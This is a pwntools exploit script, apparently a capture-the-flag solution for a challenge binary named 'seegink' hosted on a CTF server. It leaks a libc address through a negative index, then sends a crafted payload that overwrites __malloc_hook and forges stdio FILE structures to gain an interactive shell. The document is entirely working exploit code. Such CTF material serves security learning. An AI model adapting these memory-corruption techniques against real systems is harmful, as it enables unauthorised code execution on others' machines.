from pwn import *

e = ELF("./seegink")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("winter-challenge.tjcsec.club", 30001)
else:
  p = process(e.path, env={"LD_PRELOAD": libc.path})


p.sendlineafter(":", "-4")

p.recvline()

p.recv(6)
leak = u64(p.recv(8)) - 0x7f6779d34a83 + 0x00007f6779b50000

print(hex(leak))

debug()

p.recvuntil("ginkoid:")


p.sendline(
  (
    "".ljust(libc.symbols["__malloc_hook"] - libc.symbols["_IO_2_1_stdin_"] - 2, "\x00")
    + p64(leak + 0x106ef8)
  ).ljust(libc.symbols["_IO_2_1_stdout_"] - libc.symbols["_IO_2_1_stdin_"] - 2, "\x00")
   + 
  (
    (
    p64(0) + p64(0) * 3 
    + p64(0x32)
    + p64(0x1337)
    + p64(0) * 5
    ).ljust(0x88, "\x00")
    + p64(leak + libc.symbols["_IO_2_1_stdout_"])
  ).ljust(0xc0, "\x00")
  + p64(0)
  + p64(0) + p64(0) + p64(leak + 0x7fda469191b8 - 0x10 - 0x28 - 0x7fda46733000 + 0x50)
)


p.interactive()
